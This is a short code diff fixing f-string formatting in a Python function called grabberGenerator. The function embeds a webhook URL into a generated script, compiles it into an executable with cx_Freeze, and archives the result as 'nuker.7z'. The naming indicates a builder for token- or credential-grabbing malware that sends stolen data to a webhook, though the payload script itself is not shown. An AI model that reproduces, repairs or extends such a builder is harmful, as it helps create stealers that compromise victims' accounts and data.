@@ -108,11 +108,11 @@ def grabberGenerator():
                             "   executables=[Executable(\"temp/"+randomStr+".py\")]",
                             ")"]
             with open(f"temp/{randomStr}.py", mode="w") as f:
-                f.write("WEBHOOK_URL=\""+webhookUrl+"\"\n"+script)
+                f.write(f"WEBHOOK_URL=\"{webhookUrl}\"\n{script}")
             with open(f"temp/{randomStr}-setup.py", mode="w") as f:
                 f.write("\n".join(setupScript))
             
-            subprocess.run("\"{sys.executable}\" -m pip install --upgrade pip "+" ".join(libraries), shell=True)
+            subprocess.run(f"\"{sys.executable}\" -m pip install --upgrade pip "+" ".join(libraries), shell=True)
             subprocess.run(f"\"{sys.executable}\" ./temp/{randomStr}-setup.py build", shell=True)
             with py7zr.SevenZipFile("nuker.7z", 'w', filters=[{'id': py7zr.FILTER_LZMA2, 'preset': 9}]) as archive:
                 archive.writeall("./temp/nuker/", arcname='')
